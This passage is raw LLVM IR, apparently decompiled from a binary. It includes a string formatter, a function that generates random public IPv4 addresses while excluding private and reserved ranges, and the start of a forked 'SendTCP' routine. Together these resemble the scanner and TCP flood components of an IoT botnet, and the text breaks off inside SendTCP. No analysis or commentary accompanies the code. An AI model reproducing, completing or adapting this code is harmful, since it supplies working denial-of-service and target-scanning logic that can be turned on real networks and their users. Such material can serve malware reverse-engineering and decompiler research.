dec_label_pc_1000a130:                            ; preds = %dec_label_pc_1000a0e0, %dec_label_pc_1000a118
  %stack_var_-32.0 = phi i32 [ %v3_1000a11c, %dec_label_pc_1000a118 ], [ %v2_1000a0fc, %dec_label_pc_1000a0e0 ]
  %v1_1000a134 = inttoptr i32 %stack_var_-32.0 to i32*
  %v2_1000a134 = load i32, i32* %v1_1000a134, align 4
  %v7_1000a154 = call i32 @printi(i32 %tmp41, i32 %v2_1000a134, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_1000a160 = add i32 %v7_1000a154, %stack_var_-56.132
  br label %dec_label_pc_1000a3b4

dec_label_pc_1000a16c:                            ; preds = %dec_label_pc_1000a0b8
  %v2_1000a170 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a178 = icmp eq i8 %v2_1000a170, 88
  br i1 %v3_1000a178, label %dec_label_pc_1000a180, label %dec_label_pc_1000a220

dec_label_pc_1000a180:                            ; preds = %dec_label_pc_1000a16c
  %v2_1000a184 = load i8, i8* %tmp, align 1
  %tmp68 = icmp ugt i8 %v2_1000a184, 7
  br i1 %tmp68, label %dec_label_pc_1000a1cc, label %dec_label_pc_1000a194

dec_label_pc_1000a194:                            ; preds = %dec_label_pc_1000a180
  %v3_1000a198 = load i32, i32* %v2_10009f5c, align 4
  %v2_1000a1a0 = load i8, i8* %tmp, align 1
  %v3_1000a1a0 = zext i8 %v2_1000a1a0 to i32
  %v1_1000a1ac = mul nuw nsw i32 %v3_1000a1a0, 4
  %v2_1000a1b0 = add i32 %v1_1000a1ac, %v3_1000a198
  %v1_1000a1b8 = add i8 %v2_1000a1a0, 1
  store i8 %v1_1000a1b8, i8* %tmp, align 1
  br label %dec_label_pc_1000a1e4

dec_label_pc_1000a1cc:                            ; preds = %dec_label_pc_1000a180
  %v3_1000a1d0 = load i32, i32* %v2_10009f94, align 4
  %v1_1000a1d8 = add i32 %v3_1000a1d0, 4
  store i32 %v1_1000a1d8, i32* %v2_10009f94, align 4
  br label %dec_label_pc_1000a1e4

dec_label_pc_1000a1e4:                            ; preds = %dec_label_pc_1000a194, %dec_label_pc_1000a1cc
  %stack_var_-36.0 = phi i32 [ %v3_1000a1d0, %dec_label_pc_1000a1cc ], [ %v2_1000a1b0, %dec_label_pc_1000a194 ]
  %v1_1000a1e8 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_1000a1e8 = load i32, i32* %v1_1000a1e8, align 4
  %v7_1000a208 = call i32 @printi(i32 %tmp41, i32 %v2_1000a1e8, i32 16, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 65)
  %v2_1000a214 = add i32 %v7_1000a208, %stack_var_-56.132
  br label %dec_label_pc_1000a3b4

dec_label_pc_1000a220:                            ; preds = %dec_label_pc_1000a16c
  %v2_1000a224 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a22c = icmp eq i8 %v2_1000a224, 117
  br i1 %v3_1000a22c, label %dec_label_pc_1000a234, label %dec_label_pc_1000a2d4

dec_label_pc_1000a234:                            ; preds = %dec_label_pc_1000a220
  %v2_1000a238 = load i8, i8* %tmp, align 1
  %tmp69 = icmp ugt i8 %v2_1000a238, 7
  br i1 %tmp69, label %dec_label_pc_1000a280, label %dec_label_pc_1000a248

dec_label_pc_1000a248:                            ; preds = %dec_label_pc_1000a234
  %v3_1000a24c = load i32, i32* %v2_10009f5c, align 4
  %v2_1000a254 = load i8, i8* %tmp, align 1
  %v3_1000a254 = zext i8 %v2_1000a254 to i32
  %v1_1000a260 = mul nuw nsw i32 %v3_1000a254, 4
  %v2_1000a264 = add i32 %v1_1000a260, %v3_1000a24c
  %v1_1000a26c = add i8 %v2_1000a254, 1
  store i8 %v1_1000a26c, i8* %tmp, align 1
  br label %dec_label_pc_1000a298

dec_label_pc_1000a280:                            ; preds = %dec_label_pc_1000a234
  %v3_1000a284 = load i32, i32* %v2_10009f94, align 4
  %v1_1000a28c = add i32 %v3_1000a284, 4
  store i32 %v1_1000a28c, i32* %v2_10009f94, align 4
  br label %dec_label_pc_1000a298

dec_label_pc_1000a298:                            ; preds = %dec_label_pc_1000a248, %dec_label_pc_1000a280
  %stack_var_-40.0 = phi i32 [ %v3_1000a284, %dec_label_pc_1000a280 ], [ %v2_1000a264, %dec_label_pc_1000a248 ]
  %v1_1000a29c = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_1000a29c = load i32, i32* %v1_1000a29c, align 4
  %v7_1000a2bc = call i32 @printi(i32 %tmp41, i32 %v2_1000a29c, i32 10, i32 0, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_1000a2c8 = add i32 %v7_1000a2bc, %stack_var_-56.132
  br label %dec_label_pc_1000a3b4

dec_label_pc_1000a2d4:                            ; preds = %dec_label_pc_1000a220
  %v2_1000a2d8 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a2e0 = icmp eq i8 %v2_1000a2d8, 99
  br i1 %v3_1000a2e0, label %dec_label_pc_1000a2e8, label %dec_label_pc_1000a3b4

dec_label_pc_1000a2e8:                            ; preds = %dec_label_pc_1000a2d4
  %v2_1000a2ec = load i8, i8* %tmp, align 1
  %tmp70 = icmp ugt i8 %v2_1000a2ec, 7
  br i1 %tmp70, label %dec_label_pc_1000a334, label %dec_label_pc_1000a2fc

dec_label_pc_1000a2fc:                            ; preds = %dec_label_pc_1000a2e8
  %v3_1000a300 = load i32, i32* %v2_10009f5c, align 4
  %v2_1000a308 = load i8, i8* %tmp, align 1
  %v3_1000a308 = zext i8 %v2_1000a308 to i32
  %v1_1000a314 = mul nuw nsw i32 %v3_1000a308, 4
  %v2_1000a318 = add i32 %v1_1000a314, %v3_1000a300
  %v1_1000a320 = add i8 %v2_1000a308, 1
  store i8 %v1_1000a320, i8* %tmp, align 1
  br label %dec_label_pc_1000a34c

dec_label_pc_1000a334:                            ; preds = %dec_label_pc_1000a2e8
  %v3_1000a338 = load i32, i32* %v2_10009f94, align 4
  %v1_1000a340 = add i32 %v3_1000a338, 4
  store i32 %v1_1000a340, i32* %v2_10009f94, align 4
  br label %dec_label_pc_1000a34c

dec_label_pc_1000a34c:                            ; preds = %dec_label_pc_1000a2fc, %dec_label_pc_1000a334
  %stack_var_-44.0 = phi i32 [ %v3_1000a338, %dec_label_pc_1000a334 ], [ %v2_1000a318, %dec_label_pc_1000a2fc ]
  %v1_1000a350 = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_1000a350 = load i32, i32* %v1_1000a350, align 4
  %v1_1000a354 = urem i32 %v2_1000a350, 256
  store i32 %v1_1000a354, i32* %stack_var_-88, align 4
  %v5_1000a378 = call i32 @prints(i32 %tmp41, i8* %v4_1000a378, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_1000a384 = add i32 %v5_1000a378, %stack_var_-56.132
  br label %dec_label_pc_1000a3b4

dec_label_pc_1000a390:                            ; preds = %dec_label_pc_10009e20, %dec_label_pc_10009e64
  %stack_var_-68.2 = phi i8* [ %v5_10009e3c, %dec_label_pc_10009e64 ], [ %stack_var_-68.434, %dec_label_pc_10009e20 ]
  %v2_1000a394 = load i8, i8* %stack_var_-68.2, align 1
  %v3_1000a394 = zext i8 %v2_1000a394 to i32
  %v3_1000a3a4 = call i32 @printchar(i32* %arg1, i32 %v3_1000a394)
  %v1_1000a3ac = add i32 %stack_var_-56.132, 1
  br label %dec_label_pc_1000a3b4

dec_label_pc_1000a3b4:                            ; preds = %dec_label_pc_1000a2d4, %dec_label_pc_1000a34c, %dec_label_pc_1000a298, %dec_label_pc_1000a1e4, %dec_label_pc_1000a130, %dec_label_pc_1000a07c, %dec_label_pc_10009fd8, %dec_label_pc_1000a390
  %stack_var_-56.0 = phi i32 [ %v1_1000a3ac, %dec_label_pc_1000a390 ], [ %v2_10009ff8, %dec_label_pc_10009fd8 ], [ %v2_1000a0ac, %dec_label_pc_1000a07c ], [ %v2_1000a160, %dec_label_pc_1000a130 ], [ %v2_1000a214, %dec_label_pc_1000a1e4 ], [ %v2_1000a2c8, %dec_label_pc_1000a298 ], [ %v2_1000a384, %dec_label_pc_1000a34c ], [ %stack_var_-56.132, %dec_label_pc_1000a2d4 ]
  %stack_var_-68.3 = phi i8* [ %stack_var_-68.2, %dec_label_pc_1000a390 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_10009fd8 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a07c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a130 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a1e4 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a298 ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a34c ], [ %stack_var_-68.1.lcssa, %dec_label_pc_1000a2d4 ]
  %v4_1000a3b4 = ptrtoint i8* %stack_var_-68.3 to i32
  %v1_1000a3b8 = add i32 %v4_1000a3b4, 1
  %stack_var_-68.4 = inttoptr i32 %v1_1000a3b8 to i8*
  %v2_1000a3c4 = load i8, i8* %stack_var_-68.4, align 1
  %v3_1000a3cc = icmp eq i8 %v2_1000a3c4, 0
  br i1 %v3_1000a3cc, label %dec_label_pc_1000a3d4, label %dec_label_pc_10009e20

dec_label_pc_1000a3d4:                            ; preds = %dec_label_pc_10009e34, %dec_label_pc_1000a3b4, %entry
  %stack_var_-56.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-56.132, %dec_label_pc_10009e34 ], [ %stack_var_-56.0, %dec_label_pc_1000a3b4 ]
  %v3_1000a3d8 = icmp eq i32* %arg1, null
  br i1 %v3_1000a3d8, label %dec_label_pc_1000a3f0, label %dec_label_pc_1000a3e0

dec_label_pc_1000a3e0:                            ; preds = %dec_label_pc_1000a3d4
  %v2_1000a3e4 = load i32, i32* %arg1, align 4
  %v3_1000a3ec = inttoptr i32 %v2_1000a3e4 to i8*
  store i8 0, i8* %v3_1000a3ec, align 1
  br label %dec_label_pc_1000a3f0

dec_label_pc_1000a3f0:                            ; preds = %dec_label_pc_1000a3d4, %dec_label_pc_1000a3e0
  ret i32 %stack_var_-56.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-68.4, { 1, 0 }
  uselistorder i8* %stack_var_-68.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_-68.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10009ea8, { 1, 0 }
  uselistorder i32 %stack_var_-52.0.ph, { 1, 0 }
  uselistorder i8* %v5_10009e3c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-56.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-68.4.in33, { 1, 0 }
  uselistorder i32* %v2_10009f94, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_1000a3f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000a3d4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000a3b4, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_1000a390, { 1, 0 }
  uselistorder label %dec_label_pc_1000a34c, { 1, 0 }
  uselistorder label %dec_label_pc_1000a298, { 1, 0 }
  uselistorder label %dec_label_pc_1000a1e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a130, { 1, 0 }
  uselistorder label %dec_label_pc_1000a07c, { 1, 0 }
  uselistorder label %dec_label_pc_10009fd8, { 1, 0 }
  uselistorder label %dec_label_pc_10009fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10009f30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009f1c, { 1, 0 }
  uselistorder label %dec_label_pc_10009ea4, { 1, 0 }
  uselistorder label %dec_label_pc_10009e20, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-120, align 4
  store i32 2, i32* %stack_var_-136, align 4
  %v2_1000a494 = ptrtoint i32* %stack_var_-136 to i32
  store i32 268477600, i32* @lr, align 4
  %v4_1000a49c = call i32 @print(i32* nonnull %stack_var_-120, i32 %arg2, i32 %v2_1000a494)
  ret i32 %v4_1000a49c

; uselistorder directives
  uselistorder i32* %stack_var_-136, { 1, 0 }
}

define i32 @getRandomPublicIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 268477664, i32* @lr, align 4
  %v0_1000a4dc = call i32 @random()
  %v2_1000a4fc = srem i32 %v0_1000a4dc, 224
  %v6_1000a51c = trunc i32 %v2_1000a4fc to i8
  store i32 268477732, i32* @lr, align 4
  %v0_1000a520 = call i32 @random()
  %v2_1000a540 = srem i32 %v0_1000a520, 255
  %v1_1000a560 = trunc i32 %v2_1000a540 to i8
  store i32 268477800, i32* @lr, align 4
  %v0_1000a564 = call i32 @random()
  %v2_1000a584 = srem i32 %v0_1000a564, 255
  %v1_1000a5a4 = trunc i32 %v2_1000a584 to i8
  store i32 268477868, i32* @lr, align 4
  %v0_1000a5a8 = call i32 @random()
  br label %dec_label_pc_1000a700

dec_label_pc_1000a5f0:                            ; preds = %dec_label_pc_1000a7a4, %dec_label_pc_1000a9a4, %dec_label_pc_1000a984, %dec_label_pc_1000a974, %dec_label_pc_1000a954, %dec_label_pc_1000a934, %dec_label_pc_1000a904, %dec_label_pc_1000a8d4, %dec_label_pc_1000a8b4, %dec_label_pc_1000a884, %dec_label_pc_1000a854, %dec_label_pc_1000a844, %dec_label_pc_1000a824, %dec_label_pc_1000a804, %dec_label_pc_1000a7d4, %dec_label_pc_1000a774, %dec_label_pc_1000a754, %dec_label_pc_1000a740, %dec_label_pc_1000a710, %dec_label_pc_1000a700
  store i32 268477940, i32* @lr, align 4
  %v0_1000a5f0 = call i32 @random()
  %v2_1000a610 = srem i32 %v0_1000a5f0, 224
  %v6_1000a630 = trunc i32 %v2_1000a610 to i8
  store i32 268478008, i32* @lr, align 4
  %v0_1000a634 = call i32 @random()
  %v2_1000a654 = srem i32 %v0_1000a634, 255
  %v1_1000a674 = trunc i32 %v2_1000a654 to i8
  store i32 268478076, i32* @lr, align 4
  %v0_1000a678 = call i32 @random()
  %v2_1000a698 = srem i32 %v0_1000a678, 255
  %v1_1000a6b8 = trunc i32 %v2_1000a698 to i8
  store i32 268478144, i32* @lr, align 4
  %v0_1000a6bc = call i32 @random()
  br label %dec_label_pc_1000a700

dec_label_pc_1000a700:                            ; preds = %entry, %dec_label_pc_1000a5f0
  %storemerge.in = phi i32 [ %v0_1000a5a8, %entry ], [ %v0_1000a6bc, %dec_label_pc_1000a5f0 ]
  %stack_var_-70.0 = phi i8 [ %v1_1000a5a4, %entry ], [ %v1_1000a6b8, %dec_label_pc_1000a5f0 ]
  %stack_var_-71.0 = phi i8 [ %v1_1000a560, %entry ], [ %v1_1000a674, %dec_label_pc_1000a5f0 ]
  %stack_var_-72.0 = phi i8 [ %v6_1000a51c, %entry ], [ %v6_1000a630, %dec_label_pc_1000a5f0 ]
  %storemerge = srem i32 %storemerge.in, 255
  %v4_1000a7002 = zext i8 %stack_var_-72.0 to i32
  %v3_1000a708 = icmp eq i8 %stack_var_-72.0, 0
  br i1 %v3_1000a708, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a710

dec_label_pc_1000a710:                            ; preds = %dec_label_pc_1000a700
  %v3_1000a718 = icmp eq i8 %stack_var_-72.0, 10
  br i1 %v3_1000a718, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a720

dec_label_pc_1000a720:                            ; preds = %dec_label_pc_1000a710
  %v3_1000a728 = icmp eq i8 %stack_var_-72.0, 100
  br i1 %v3_1000a728, label %dec_label_pc_1000a730, label %dec_label_pc_1000a754

dec_label_pc_1000a730:                            ; preds = %dec_label_pc_1000a720
  %tmp50 = icmp ult i8 %stack_var_-71.0, 64
  br i1 %tmp50, label %dec_label_pc_1000a754, label %dec_label_pc_1000a740

dec_label_pc_1000a740:                            ; preds = %dec_label_pc_1000a730
  %tmp51 = icmp sgt i8 %stack_var_-71.0, -1
  br i1 %tmp51, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a754

dec_label_pc_1000a754:                            ; preds = %dec_label_pc_1000a720, %dec_label_pc_1000a740, %dec_label_pc_1000a730
  %v3_1000a75c = icmp eq i8 %stack_var_-72.0, 127
  br i1 %v3_1000a75c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a764

dec_label_pc_1000a764:                            ; preds = %dec_label_pc_1000a754
  %v3_1000a76c = icmp eq i8 %stack_var_-72.0, -87
  br i1 %v3_1000a76c, label %dec_label_pc_1000a774, label %dec_label_pc_1000a784

dec_label_pc_1000a774:                            ; preds = %dec_label_pc_1000a764
  %v3_1000a77c = icmp eq i8 %stack_var_-71.0, -2
  br i1 %v3_1000a77c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a784

dec_label_pc_1000a784:                            ; preds = %dec_label_pc_1000a764, %dec_label_pc_1000a774
  %v3_1000a78c = icmp eq i8 %stack_var_-72.0, -84
  br i1 %v3_1000a78c, label %dec_label_pc_1000a794, label %dec_label_pc_1000a7b4

dec_label_pc_1000a794:                            ; preds = %dec_label_pc_1000a784
  %v2_1000a79c = icmp ugt i8 %stack_var_-71.0, 16
  br i1 %v2_1000a79c, label %dec_label_pc_1000a7b4, label %dec_label_pc_1000a7a4

dec_label_pc_1000a7a4:                            ; preds = %dec_label_pc_1000a794
  br label %dec_label_pc_1000a5f0

dec_label_pc_1000a7b4:                            ; preds = %dec_label_pc_1000a784, %dec_label_pc_1000a794
  %v3_1000a7bc = icmp eq i8 %stack_var_-72.0, -64
  br i1 %v3_1000a7bc, label %dec_label_pc_1000a7c4, label %dec_label_pc_1000a814

dec_label_pc_1000a7c4:                            ; preds = %dec_label_pc_1000a7b4
  %v3_1000a7cc = icmp eq i8 %stack_var_-71.0, 0
  br i1 %v3_1000a7cc, label %dec_label_pc_1000a7d4, label %dec_label_pc_1000a7f4

dec_label_pc_1000a7d4:                            ; preds = %dec_label_pc_1000a7c4
  %v3_1000a7dc = icmp eq i8 %stack_var_-70.0, 2
  br i1 %v3_1000a7dc, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a7f4

dec_label_pc_1000a7f4:                            ; preds = %dec_label_pc_1000a7c4, %dec_label_pc_1000a7d4
  %v3_1000a7fc = icmp eq i8 %stack_var_-71.0, 88
  br i1 %v3_1000a7fc, label %dec_label_pc_1000a804, label %dec_label_pc_1000a824

dec_label_pc_1000a804:                            ; preds = %dec_label_pc_1000a7f4
  %v3_1000a80c = icmp eq i8 %stack_var_-70.0, 99
  br i1 %v3_1000a80c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a824

dec_label_pc_1000a814:                            ; preds = %dec_label_pc_1000a7b4
  br label %dec_label_pc_1000a834

dec_label_pc_1000a824:                            ; preds = %dec_label_pc_1000a7f4, %dec_label_pc_1000a804
  %v3_1000a82c = icmp eq i8 %stack_var_-71.0, -88
  br i1 %v3_1000a82c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a834

dec_label_pc_1000a834:                            ; preds = %dec_label_pc_1000a814, %dec_label_pc_1000a824
  %v3_1000a83c = icmp eq i8 %stack_var_-72.0, -58
  br i1 %v3_1000a83c, label %dec_label_pc_1000a844, label %dec_label_pc_1000a864

dec_label_pc_1000a844:                            ; preds = %dec_label_pc_1000a834
  %v3_1000a84c = icmp eq i8 %stack_var_-71.0, 18
  br i1 %v3_1000a84c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a854

dec_label_pc_1000a854:                            ; preds = %dec_label_pc_1000a844
  %v3_1000a85c = icmp eq i8 %stack_var_-71.0, 19
  br i1 %v3_1000a85c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a874

dec_label_pc_1000a864:                            ; preds = %dec_label_pc_1000a834
  br label %dec_label_pc_1000a894

dec_label_pc_1000a874:                            ; preds = %dec_label_pc_1000a854
  %v3_1000a87c = icmp eq i8 %stack_var_-71.0, 51
  br i1 %v3_1000a87c, label %dec_label_pc_1000a884, label %dec_label_pc_1000a894

dec_label_pc_1000a884:                            ; preds = %dec_label_pc_1000a874
  %v3_1000a88c = icmp eq i8 %stack_var_-70.0, 100
  br i1 %v3_1000a88c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a894

dec_label_pc_1000a894:                            ; preds = %dec_label_pc_1000a864, %dec_label_pc_1000a874, %dec_label_pc_1000a884
  %v3_1000a89c = icmp eq i8 %stack_var_-72.0, -53
  br i1 %v3_1000a89c, label %dec_label_pc_1000a8a4, label %dec_label_pc_1000a8c4

dec_label_pc_1000a8a4:                            ; preds = %dec_label_pc_1000a894
  %v3_1000a8ac = icmp eq i8 %stack_var_-71.0, 0
  br i1 %v3_1000a8ac, label %dec_label_pc_1000a8b4, label %dec_label_pc_1000a8c4

dec_label_pc_1000a8b4:                            ; preds = %dec_label_pc_1000a8a4
  %v3_1000a8bc = icmp eq i8 %stack_var_-70.0, 113
  br i1 %v3_1000a8bc, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a8c4

dec_label_pc_1000a8c4:                            ; preds = %dec_label_pc_1000a8a4, %dec_label_pc_1000a894, %dec_label_pc_1000a8b4
  %v3_1000a8cc = icmp eq i8 %stack_var_-72.0, 62
  br i1 %v3_1000a8cc, label %dec_label_pc_1000a8d4, label %dec_label_pc_1000a8e4

dec_label_pc_1000a8d4:                            ; preds = %dec_label_pc_1000a8c4
  %tmp52 = icmp ult i8 %stack_var_-71.0, 31
  br i1 %tmp52, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a8e4

dec_label_pc_1000a8e4:                            ; preds = %dec_label_pc_1000a8c4, %dec_label_pc_1000a8d4
  %v3_1000a8ec = icmp eq i8 %stack_var_-72.0, -49
  br i1 %v3_1000a8ec, label %dec_label_pc_1000a8f4, label %dec_label_pc_1000a914

dec_label_pc_1000a8f4:                            ; preds = %dec_label_pc_1000a8e4
  %tmp53 = icmp ult i8 %stack_var_-71.0, 31
  br i1 %tmp53, label %dec_label_pc_1000a914, label %dec_label_pc_1000a904

dec_label_pc_1000a904:                            ; preds = %dec_label_pc_1000a8f4
  %tmp54 = icmp ult i8 %stack_var_-70.0, 121
  br i1 %tmp54, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a914

dec_label_pc_1000a914:                            ; preds = %dec_label_pc_1000a8e4, %dec_label_pc_1000a904, %dec_label_pc_1000a8f4
  %v3_1000a91c = icmp eq i8 %stack_var_-72.0, 65
  br i1 %v3_1000a91c, label %dec_label_pc_1000a924, label %dec_label_pc_1000a944

dec_label_pc_1000a924:                            ; preds = %dec_label_pc_1000a914
  %tmp55 = icmp ult i8 %stack_var_-71.0, -32
  br i1 %tmp55, label %dec_label_pc_1000a944, label %dec_label_pc_1000a934

dec_label_pc_1000a934:                            ; preds = %dec_label_pc_1000a924
  %tmp56 = icmp ult i8 %stack_var_-70.0, -29
  br i1 %tmp56, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a944

dec_label_pc_1000a944:                            ; preds = %dec_label_pc_1000a914, %dec_label_pc_1000a934, %dec_label_pc_1000a924
  %v3_1000a94c = icmp eq i8 %stack_var_-72.0, -61
  br i1 %v3_1000a94c, label %dec_label_pc_1000a954, label %dec_label_pc_1000a964

dec_label_pc_1000a954:                            ; preds = %dec_label_pc_1000a944
  %v3_1000a95c = icmp eq i8 %stack_var_-71.0, 10
  br i1 %v3_1000a95c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a964

dec_label_pc_1000a964:                            ; preds = %dec_label_pc_1000a944, %dec_label_pc_1000a954
  %v3_1000a96c = icmp eq i8 %stack_var_-72.0, -40
  %v4_1000a974 = zext i8 %stack_var_-71.0 to i32
  br i1 %v3_1000a96c, label %dec_label_pc_1000a974, label %dec_label_pc_1000a994

dec_label_pc_1000a974:                            ; preds = %dec_label_pc_1000a964
  %v3_1000a97c = icmp eq i8 %stack_var_-71.0, 25
  br i1 %v3_1000a97c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a984

dec_label_pc_1000a984:                            ; preds = %dec_label_pc_1000a974
  %v3_1000a98c = icmp eq i8 %stack_var_-71.0, 94
  br i1 %v3_1000a98c, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a994

dec_label_pc_1000a994:                            ; preds = %dec_label_pc_1000a964, %dec_label_pc_1000a984
  %v3_1000a99c = icmp eq i8 %stack_var_-72.0, -44
  br i1 %v3_1000a99c, label %dec_label_pc_1000a9a4, label %dec_label_pc_1000a9b4

dec_label_pc_1000a9a4:                            ; preds = %dec_label_pc_1000a994
  %v3_1000a9ac = icmp eq i8 %stack_var_-71.0, 56
  br i1 %v3_1000a9ac, label %dec_label_pc_1000a5f0, label %dec_label_pc_1000a9b4

dec_label_pc_1000a9b4:                            ; preds = %dec_label_pc_1000a994, %dec_label_pc_1000a9a4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1000a9d4 = ptrtoint i32* %stack_var_-68 to i32
  %v4_1000a9f8 = zext i8 %stack_var_-70.0 to i32
  %v4_1000aa04 = urem i32 %storemerge, 256
  %v7_1000aa28 = call i32 @szprintf(i32 %v2_1000a9d4, i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), i32 %v4_1000a7002, i32 %v4_1000a974, i32 %v4_1000a9f8, i32 %v4_1000aa04)
  store i32 268479032, i32* @lr, align 4
  %v1_1000aa34 = call i32 @inet_addr(i32 %v2_1000a9d4)
  ret i32 %v1_1000aa34

; uselistorder directives
  uselistorder i32 %v2_1000a9d4, { 1, 0 }
  uselistorder i8 %stack_var_-72.0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i8 %stack_var_-71.0, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18 }
  uselistorder i8 %stack_var_-70.0, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32 ptrtoint ([12 x i8]* @global_var_1002abec.275 to i32), { 0, 1, 6, 2, 7, 3, 8, 4, 9, 5, 10 }
  uselistorder label %dec_label_pc_1000a9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a994, { 1, 0 }
  uselistorder label %dec_label_pc_1000a964, { 1, 0 }
  uselistorder label %dec_label_pc_1000a944, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a914, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a8e4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a8c4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000a894, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a834, { 1, 0 }
  uselistorder label %dec_label_pc_1000a824, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a7b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000a784, { 1, 0 }
  uselistorder label %dec_label_pc_1000a754, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000a700, { 1, 0 }
  uselistorder label %dec_label_pc_1000a5f0, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19 }
}

define i32 @SendTCP(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000aa58 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000aa58, i32* %stack_var_-144, align 4
  store i32 268479104, i32* @lr, align 4
  %v0_1000aa7c = call i32 @listFork()
  %v3_1000aa84 = icmp eq i32 %v0_1000aa7c, 0
  br i1 %v3_1000aa84, label %dec_label_pc_1000aa90, label %dec_label_pc_1000b150

dec_label_pc_1000aa90:                            ; preds = %entry
  %v2_1000aa9c = load i32, i32* %arg1, align 4
  %v1_1000aaa8 = add i32 %tmp, 4
  %v2_1000aaa8 = inttoptr i32 %v1_1000aaa8 to i32*
  %v3_1000aaa8 = load i32, i32* %v2_1000aaa8, align 4
  %v1_1000aab4 = add i32 %tmp, 8
  %v2_1000aab4 = inttoptr i32 %v1_1000aab4 to i32*
  %v3_1000aab4 = load i32, i32* %v2_1000aab4, align 4
  %v1_1000aac0 = add i32 %tmp, 12
  %v2_1000aac0 = inttoptr i32 %v1_1000aac0 to i32*
  %v3_1000aac0 = load i32, i32* %v2_1000aac0, align 4
  %v1_1000aacc = add i32 %tmp, 16
  %v2_1000aacc = inttoptr i32 %v1_1000aacc to i32*
  %v3_1000aacc = load i32, i32* %v2_1000aacc, align 4
  %v1_1000aad8 = add i32 %tmp, 20
